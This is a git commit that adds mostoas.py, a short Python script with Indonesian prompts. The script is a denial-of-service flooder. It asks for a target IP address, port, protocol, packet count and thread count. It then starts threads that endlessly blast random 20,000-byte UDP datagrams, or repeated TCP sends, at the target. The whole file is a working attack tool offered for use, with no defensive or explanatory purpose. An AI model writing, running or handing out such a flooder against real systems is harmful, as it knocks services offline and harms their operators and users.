07bd9fadb07dc0d3c5745e8ae691a5116ac9e3ad
dita44 <83097973+dita44@users.noreply.github.com>
2021-08-21 11:14:42 +0800

    Add files via upload

---
+++ mostoas.py
@@ -0,0 +1,48 @@
+#!/usr/bin/env python3
+#Code by Rence
+import random
+import socket
+import threading
+
+print("~~~ TOOLS ASLI BY : RENCE ~~~")
+print("~~~ DI REMAKE OLEH : MOSTOAS ~~~")
+ip = str(input(" Target Ip:"))
+port = int(input(" Target Port:"))
+choice = str(input(" UDP(y/n):"))
+times = int(input(" Paket yang dikirim ke target:"))
+threads = int(input(" Threads yang dikirim:"))
+def run():
+	data = random._urandom(20000)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Paket!!!")
+		except:
+			print("[!] MENGERROR!!!")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Paket!!!")
+		except:
+			s.close()
+			print("[*] MENGERROR")
+            
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
